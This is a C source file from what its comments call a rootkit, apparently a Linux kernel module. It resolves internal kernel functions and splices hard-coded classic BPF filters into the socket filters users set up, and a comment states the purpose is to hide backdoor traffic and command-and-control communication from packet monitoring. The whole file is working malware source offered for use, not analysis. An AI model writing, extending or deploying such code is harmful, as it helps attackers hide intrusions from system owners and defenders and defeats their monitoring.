#include <linux/socket.h>
#include <linux/filter.h>
#include "traffic.h"
#include "../../utils.h"

struct sock_filter icmp_filter_code[] = {
    { 0x28, 0, 0, 0x0000000c },
    { 0x15, 0, 3, 0x00000800 },
    { 0x30, 0, 0, 0x00000017 },
    { 0x15, 0, 1, 0x00000001 },
    { 0x6, 0, 0, 0x00040000 },
    { 0x6, 0, 0, 0x00000000 },
};

struct sock_filter mac_filter_code[] = {
    { 0x20, 0, 0, 0x00000008 },
    { 0x15, 0, 3, 0x27abaceb },
    { 0x28, 0, 0, 0x00000006 },
    { 0x15, 0, 1, 0x00000800 },
    { 0x6, 0, 0, 0x00040000 },
    { 0x6, 0, 0, 0x00000000 },
};

static int rooti_concat_filter_programs(struct sock_fprog_kern *dest_program)
{
    // Subtracting the two ret instructions of the first program which are irrelevant
    loff_t user_program_offset = ARRAY_SIZE(icmp_filter_code) - 2;
    size_t user_program_len = ARRAY_SIZE(mac_filter_code);

    dest_program->len = user_program_offset + user_program_len;
    dest_program->filter = kcalloc(dest_program->len, sizeof(struct sock_filter), GFP_KERNEL);
    if (dest_program->filter == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }

    ROOTI_DEBUG("%d", dest_program->len);

    memcpy(dest_program->filter, icmp_filter_code, sizeof(icmp_filter_code));
    memcpy(dest_program->filter + user_program_offset, mac_filter_code, sizeof(mac_filter_code));

    // Fixup for kernel program offsets
    for (int i = 0; i < user_program_offset; i++) {
        if (dest_program->filter[i].code != 0x15) {
            continue;
        }
        // TODO: handle jumps of more than 255 instructions
        dest_program->filter[i].jf += user_program_len - 2;
    }

    for (int i = 0; i < dest_program->len; i++) {
        ROOTI_DEBUG("{ 0x%x, 0x%x, 0x%x, 0x%x },",
            dest_program->filter[i].code,
            dest_program->filter[i].jt,
            dest_program->filter[i].jf,
            dest_program->filter[i].k
        );
    }

    // Should free the filter program somehow!!

    return 0;
}

/*
    This function attaches additional cBPF filters (which are specifyed in the rootkit's configuration)
    to the filters specified by the user. This is used to conceal certain network traffic that we wish to hide,
    such as backdoor traffic or communication with C&C.
*/
int rooti_attach_traffic_filter(struct sock *sock)
{
    ROOTI_RESOLVE_FUNC_ADDR(__sk_attach_prog, -EINVAL, int, struct bpf_prog *, struct sock *);

    struct sock_fprog_kern filter_program;
    struct bpf_prog *bpf_program;
    int err;

    err = rooti_concat_filter_programs(&filter_program);
    if (err) {
        return err;
    }

    err = bpf_prog_create(&bpf_program, &filter_program);
    if (bpf_program == NULL) {
        ROOTI_DEBUG("bpf_prog_create() failed %d", err);
        return err;
    }

    err = ____sk_attach_prog(bpf_program, sock);
    if (err) {
        bpf_prog_destroy(bpf_program);
        ROOTI_DEBUG("__sk_attach_prog() failed: %d", err);
        return err;
    }

    return 0;
}